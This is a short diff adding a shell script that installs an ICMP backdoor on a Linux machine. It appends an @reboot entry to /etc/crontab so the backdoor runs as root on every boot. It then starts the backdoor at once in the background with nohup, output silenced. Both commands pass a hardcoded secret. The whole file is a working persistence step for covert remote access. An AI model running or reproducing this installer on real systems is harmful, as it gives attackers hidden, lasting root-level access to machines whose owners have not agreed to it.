@@ -1,0 +1,7 @@
+#!/bin/sh
+
+# Set crontab to run it every boot:
+echo "@reboot root /usr/bin/python3 /usr/bin/icmp-backdoor --secret p4sswd > /dev/null 2>&1" >> /etc/crontab
+
+# Start:
+nohup /usr/bin/python3 /usr/bin/icmp-backdoor --secret p4sswd > /dev/null 2>&1 &
